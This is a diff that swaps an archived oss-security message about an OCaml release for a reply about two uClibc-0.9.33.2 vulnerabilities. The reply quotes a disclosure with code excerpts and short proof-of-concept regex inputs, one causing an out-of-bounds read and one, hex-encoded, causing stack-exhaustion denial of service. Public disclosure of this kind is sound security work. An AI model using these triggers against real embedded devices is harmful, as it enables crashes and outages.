@@ -1,23 +1,97 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/23/12
-Message-ID: <20170623162626.GA3446@jasmine.lan>
-Date: Fri, 23 Jun 2017 12:26:26 -0400
-From: Leo Famulari <leo@...ulari.name>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-9772: OCaml release 4.04.2
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/16/7
+Message-ID: <01c242ae-3570-c98c-4e29-8b736bd0b1dd@trylinux.us>
+Date: Fri, 16 Jun 2017 01:21:53 -0400
+From: Zach W <kestrel@...linux.us>
+To: oss-security@...ts.openwall.com, fefe <qbenjin@...com>
+Subject: Re: two vulns in uClibc-0.9.33.2
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Jun 23, 2017 at 12:24:47PM -0400, Leo Famulari wrote:
-> Hi Anil,
-> 
-> Can you tell us where to get OCaml 4.04.2? It's not available here:
-> 
-> https://ocaml.org/releases/
+s/large\ number/nearly\ all/g
 
-Sorry for the noise, I see that it's available on GitHub:
+Talking millions, not thousands.
 
-https://github.com/ocaml/ocaml/releases
+Zach W.
 
-Is that the new canonical source of OCaml releases?
 
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+On 6/15/17 11:53 PM, fefe wrote:
+> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
+>
+>
+> one is about line 2682 of get_subexp.c :
+>
+>
+> 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
+> 		{
+> 		  /* If we are at the end of the input, we cannot match.  */
+> 		  if (bkref_str_off >= mctx->input.len)
+> 		    break;
+>
+>
+> 		  err = extend_buffers (mctx);
+> 		  if (BE (err != REG1_NOERROR, 0))
+> 		    return err;
+>
+>
+> 		  buf = (const char *) re_string_get_buffer (&mctx->input);
+> 		}
+> 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
+> 		break; /* We don't need to search this sub expression
+> 		
+> "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
+>
+>
+> The poc code like:
+> 	
+> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+> 	{		
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+>
+>
+> The another is aout line 1837 of regexce.c :
+>
+>
+> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
+> 			     int subexp_idx, int from_node, int bkref_idx)
+>                 .......
+>
+>
+> 		  cpos =
+> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+> 						 dst, bkref_idx);
+>
+>
+> 		
+> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
+>
+>
+> The poc code like:	
+> 	
+> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+> 	{		
+>         	reg1match_t pmatch[1];
+> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+> 		regfree(&regtmp);
+> 	}
+>
+>
+>
+>
+> A large number of embedded devices uses uclibc instead of glibc.
+> Could you assign CVE id for those?
+>
+>
+> Thank you
+>
+>
+> Benjin Liu
+> Codesafe Team of Qihoo 360
+
+
